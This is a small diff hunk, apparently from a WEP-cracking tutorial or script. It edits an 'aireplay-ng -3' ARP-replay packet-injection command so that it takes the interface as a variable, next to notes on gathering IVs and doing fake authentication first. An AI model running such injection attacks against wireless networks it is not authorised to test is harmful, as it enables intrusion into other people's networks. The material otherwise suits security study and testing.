@@ -5,4 +5,4 @@ forcing it to generate thousands of encrypted responses that contain IVs needed 
 
 Perform Fake Authentication first
 
-aireplay-ng -3 -b $ap_mac -h $local_mac wlan1mon
+aireplay-ng -3 -b $ap_mac -h $local_mac $interface
